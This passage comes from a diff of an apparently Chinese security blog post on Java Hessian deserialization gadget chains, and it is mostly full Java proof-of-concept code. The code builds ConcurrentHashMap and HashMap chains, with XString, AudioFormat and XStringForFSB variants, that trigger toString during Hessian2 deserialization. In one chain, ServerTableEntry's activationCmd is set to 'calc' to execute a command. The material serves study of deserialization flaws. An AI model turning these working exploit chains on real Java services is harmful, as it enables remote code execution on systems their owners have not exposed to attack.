class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;sizeCtl&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, conEntry1, conEntry1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, conEntry2, conEntry2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> ConcurrentHashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        table.set(s, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        sf.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.setSerializerFactory(sf);</span><br><span class="line">        out.writeObject(s);</span><br><span class="line">        out.flush();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream).readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithObjectNoArgsConstructor</span><span class="params">(Class&lt;T&gt; clzToInstantiate)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">T</span> <span class="variable">resObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            resObject = createWithConstructor(clzToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resObject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        setAccessible(objCons);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        setAccessible(sc);</span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(AccessibleObject member)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">versionStr</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">javaVersion</span> <span class="operator">=</span> Integer.parseInt(versionStr.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// not possible to quiet runtime warnings anymore...</span></span><br><span class="line">        <span class="comment">// see https://bugs.openjdk.java.net/browse/JDK-8210522</span></span><br><span class="line">        <span class="comment">// to understand impact on Permit (i.e. it does not work</span></span><br><span class="line">        <span class="comment">// anymore with Java &gt;= 12)</span></span><br><span class="line">        member.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="audioformat"><a class="markdownIt-Anchor" href="#audioformat"></a> AudioFormat</h4>
+<p>其实这里就是上一个链子换了个类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这条链</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">conEntry</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(Class.forName(<span class="string">&quot;javax.sound.sampled.AudioFormat$Encoding&quot;</span>));</span><br><span class="line">        <span class="comment">//Object conEntry = createWithObjectNoArgsConstructor(Class.forName(&quot;javax.sound.sampled.AudioFileFormat$Type&quot;));</span></span><br></pre></td></tr></table></figure>
+<h4 id="xtring"><a class="markdownIt-Anchor" href="#xtring"></a> Xtring</h4>
+<p>依旧换了个类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XString</span> <span class="variable">conEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="comment">//Object conEntry = createWithObjectNoArgsConstructor(Class.forName(&quot;javax.sound.sampled.AudioFormat$Encoding&quot;));</span></span><br><span class="line">        <span class="comment">//Object conEntry = createWithObjectNoArgsConstructor(Class.forName(&quot;javax.sound.sampled.AudioFileFormat$Type&quot;));</span></span><br></pre></td></tr></table></figure>
+<h4 id="xstringforchars"><a class="markdownIt-Anchor" href="#xstringforchars"></a> XStringForChars</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XStringForChars</span> <span class="variable">conEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStringForChars</span>(<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        setFieldValue(conEntry, <span class="string">&quot;m_strCache&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">//XString conEntry = new XString(&quot;xxx&quot;);</span></span><br><span class="line">        <span class="comment">//Object conEntry = createWithObjectNoArgsConstructor(Class.forName(&quot;javax.sound.sampled.AudioFormat$Encoding&quot;));</span></span><br><span class="line">        <span class="comment">//Object conEntry = createWithObjectNoArgsConstructor(Class.forName(&quot;javax.sound.sampled.AudioFileFormat$Type&quot;));</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure>
+<h3 id="hashmap-xstringforfsb-tostring"><a class="markdownIt-Anchor" href="#hashmap-xstringforfsb-tostring"></a> HashMap-&gt;XStringForFSB-&gt;toString</h3>
+<p>这里就是通过<code>XStringForFSB#equals</code>中的任意调用<code>toString</code>来触发的。</p>
+<p><img src="../images/image-20251226020008482.png" alt="image-20251226020008482" /></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.corba.se.impl.activation.ServerManagerImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.corba.se.impl.activation.ServerTableEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XStringForFSB;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.sun.org.apache.xalan.internal.xsltc.compiler.Constants.CHARACTERS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap_XStringForFSB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span>createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line">        <span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerTableEntry.class);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="number">0</span>, serverTableEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;exit&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, map);</span><br><span class="line">        setFieldValue(serverTableEntry,<span class="string">&quot;state&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;process&quot;</span>, process);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;activationCmd&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(serverManager);</span><br><span class="line"></span><br><span class="line">        <span class="type">XStringForFSB</span> <span class="variable">xStringForFSB</span> <span class="operator">=</span> createWithoutConstructor(XStringForFSB.class);</span><br><span class="line">        setFieldValue(xStringForFSB, <span class="string">&quot;m_strCache&quot;</span>, <span class="string">&quot;1111111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">conEntry1</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(Class.forName(<span class="string">&quot;java.util.AbstractMap$SimpleEntry&quot;</span>));</span><br><span class="line">        setFieldValue(conEntry1,<span class="string">&quot;key&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;aa&quot;</span>,conEntry1);</span><br><span class="line">        map1.put(<span class="string">&quot;bB&quot;</span>,xStringForFSB);</span><br><span class="line">        map2.put(<span class="string">&quot;aa&quot;</span>,xStringForFSB);</span><br><span class="line">        map2.put(<span class="string">&quot;bB&quot;</span>,conEntry1);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">finalMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        finalMap.put(map1,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        finalMap.put(map2,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        sf.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.setSerializerFactory(sf);</span><br><span class="line">        out.writeObject(finalMap);</span><br><span class="line">        out.flush();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream).readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> random.nextInt(<span class="number">20</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> random.nextInt(CHARACTERS.length());</span><br><span class="line">            <span class="type">char</span> <span class="variable">randomChar</span> <span class="operator">=</span> CHARACTERS.charAt(index);</span><br><span class="line">            sb.append(randomChar);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithObjectNoArgsConstructor</span><span class="params">(Class&lt;T&gt; clzToInstantiate)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">T</span> <span class="variable">resObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            resObject = createWithConstructor(clzToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resObject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        setAccessible(objCons);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        setAccessible(sc);</span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(AccessibleObject member)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">versionStr</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">javaVersion</span> <span class="operator">=</span> Integer.parseInt(versionStr.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// not possible to quiet runtime warnings anymore...</span></span><br><span class="line">        <span class="comment">// see https://bugs.openjdk.java.net/browse/JDK-8210522</span></span><br><span class="line">        <span class="comment">// to understand impact on Permit (i.e. it does not work</span></span><br><span class="line">        <span class="comment">// anymore with Java &gt;= 12)</span></span><br><span class="line">        member.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Hessian反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">JAVA反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/background-2.jpg" data-sizes="auto" alt="JAVA反序列化-FastJson全版本分析" class="lazyload">
+          
+        
+        <a href="/2025/12/26/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-FastJson%E5%85%A8%E7%89%88%E6%9C%AC%E5%88%86%E6%9E%90/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            JAVA反序列化-FastJson全版本分析
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/bg1.jpg" data-sizes="auto" alt="Crypto-赛题复现" class="lazyload">
+        
+      
+      <a href="/2025/12/24/Crypto-%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          Crypto-赛题复现
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
